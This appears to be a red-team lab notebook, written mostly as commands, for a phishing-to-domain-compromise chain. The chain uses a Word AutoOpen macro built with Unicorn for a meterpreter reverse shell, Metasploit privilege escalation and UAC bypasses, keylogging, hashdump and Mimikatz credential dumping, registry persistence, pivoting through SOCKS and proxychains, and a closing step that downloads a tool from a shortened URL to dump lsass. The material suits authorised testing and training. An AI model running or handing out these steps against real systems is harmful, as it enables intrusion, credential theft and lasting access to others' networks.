---------
Windows 10 Version 22H2 - Build 19045.2006

cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs"  /dstatus
---------
Might have to use Windows XP - https://blog.danielburrowes.com/2024/01/windows-xp-on-proxmox.html
---------
Setup Microsoft Word

- Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
- Click Developer | Macros
- Open Word / Developer / Macros / Create / AutoOpen / insert payload from Unicorn
- The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
- Macro Security - Enable all macros
- Save as a Word Macro-Enabled Document
- Create a Email and save it as a MSG file with attachement 
-------
Create a Email MSG shortcut for the following;

"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "No Account" "C:\Users\domainadmin\Desktop\email.msg"
"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "cbcuser1" "C:\Users\domainadmin\Desktop\email.msg"
start "" "C:\Users\domainadmin\Desktop\email.msg"


---------
[UPDATE METASPL0IT]
sudo passwd root
su - 
curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb && chmod 755 msfinstall && ./msfinstall
---------
[Install Unicorn]

git clone https://github.com/trustedsec/unicorn
python3 /unicorn/unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro

---------
Copy maro powershell_attack.txt into Word attachment. 

sudo mv powershell_attack.txt /home/powershell_attack.txt
scp kali@10.3.99.1:/home/powershell.txt 

---------

sudo msfconsole -r unicorn.rc
---------
sessions -i 1
load priv stdapi extapi

getuid
getsystem
background 

---------

# Run local exploit suggester to find privilege escalation paths
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
------
1   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
2   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
------
# Use the confirmed vulnerable exploit (MS16-075)
use exploit/windows/local/ms16_075_reflection
set SESSION 1
exploit

# (Optional) If that fails, try the other suggested one
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit

------

# Based on the results, choose a matching exploit (example)
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
exploit
---------
# 1. You're already SYSTEM, so now escalate capabilities or pivot
# 2. Check system info
sysinfo

# 3. List running processes
ps

# 4. Migrate to a stable process (e.g., explorer.exe)
migrate <PID>

# 5. Enable keylogging (optional)
keyscan_start
keyscan_dump

# 6. Dump SAM database (if needed)
hashdump

# 7. Search for creds in memory
load kiwi
creds_all

# Enable persistence (example using registry)
run persistence -U -i 5 -p 443 -r <KALI-IP>

# 9. Browse files
cd C:\
ls

# Download a file
download C:\\Users\\<USERNAME>\\Desktop\\secret.txt

# Upload a tool (e.g., netcat)
upload nc.exe C:\\Windows\\Temp\\nc.exe

# 12. Open a remote shell
execute -f cmd.exe -i -H

---------

# 1. Interact with your current session
sessions -i 1

# 2. List local network interfaces to get subnet info
ipconfig

# 3. Scan local subnet for live hosts (replace with actual subnet)
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24

# 4. Identify domain controller by hostname or open ports (e.g., 88, 389, 445)
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# 5. Or use Net View to list domain computers (if in a domain)
shell
net view /domain
nltest /dclist:<domain>

# 6. Use PowerShell or native tools to enumerate domain info
powershell -Command "Get-ADDomainController -Discover -Service PrimaryDC"

# 7. Use incognito/metasploit to impersonate tokens if available
use incognito
list_tokens -u
impersonate_token "<DOMAIN>\\<admin_user>"

# 8. Use port forwarding to pivot through current host to AD server
background
use auxiliary/server/socks_proxy
run

# 9. Set proxychains on Kali to use Metasploit SOCKS5
echo -e "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# 10. Use proxychains to run tools like ldapsearch or crackmapexec
proxychains crackmapexec smb 192.168.1.X -u '' -p ''

# 11. Optional: use autoroute for full pivoting
use post/multi/manage/autoroute
set SESSION 1
run

# 12. Then scan internal network through the route
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
run

---
use windows/local/bypassuac_sluihijack
set SESSION 1
exploit
getuid
getsystem

---------
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_comhijack


use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
exploit
---

use exploit/windows/local/bypassuac_comhijack
set SESSION 1
exploit
---

run post/multi/recon/local_exploit_suggester
---

use exploit/windows/local/print_spooler_dcerpc
set SESSION 1
exploit
---------

execute -f "C:\\Windows\\Sysnative\\notepad.exe"
migrate 7584
shell
---------

whoami
ping -m 1 8.8.8.8
net1 group "Domain Admins" /domain

# downloads pd64.exe ProcessDump"
bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C:\Users\Public\1.exe
cd C:\Users\Public\
C:\Users\Public\1.exe -accepteula -ma lsass.exe lsass.dmp
makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
